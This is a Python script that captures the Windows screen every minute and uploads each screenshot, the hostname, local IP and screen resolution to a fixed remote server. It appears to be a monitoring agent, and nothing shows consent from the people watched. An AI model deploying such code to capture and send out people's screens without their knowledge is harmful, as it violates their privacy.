import PIL
import pyautogui as auto
import requests as req
import time
from datetime import datetime as dt
import socket
import win32api 
import os
import json
from PIL import Image

url = 'http://sf.do.co.th:5000/upload'
data_url = 'http://sf.do.co.th:5000/upload/data'
img_quality = 30
client_name = ""
host_name = socket.gethostname()
ip = socket.gethostbyname(host_name)
w_resolution = win32api.GetSystemMetrics(0)
h_resolution = win32api.GetSystemMetrics(1)
resolution = '{}x{}'.format(w_resolution,h_resolution)

while True:
    now = dt.now()
    if(now.strftime('%S')=='00'):
        file_name = now.strftime('%Y%m%d%H%M%S')
        if(client_name==""):
            file_name = host_name+'.'+file_name
        else:
            file_name = client_name+'.'+file_name
        time.sleep(1)
        auto.screenshot(file_name+'.jpg')
        time.sleep(1)
        img = Image.open(file_name+'.jpg')
        img.save(file_name+'.jpg',quality=img_quality,optimize=True)
        time.sleep(1)
        files = {'upload_file':open(file_name+'.jpg','rb')}
        data = {
            'ip':str(ip),
            'client-name': file_name.split('.')[0],
            'resolution':resolution,
            'date' : now.strftime('%d/%m/%Y'),
            'time': now.strftime('%H:%M:%S'),
            'filename':file_name+'.jpg'
        }
        json_data = json.dumps(data)
        print(json_data)
        time.sleep(1)
        req.post(data_url,json=json_data)
        req.post(url,files=files)
        files['upload_file'].close()
        time.sleep(5)
        if os.path.exists(file_name+'.jpg'):
            os.remove(file_name+'.jpg')
        else:
            print("The file does not exist")
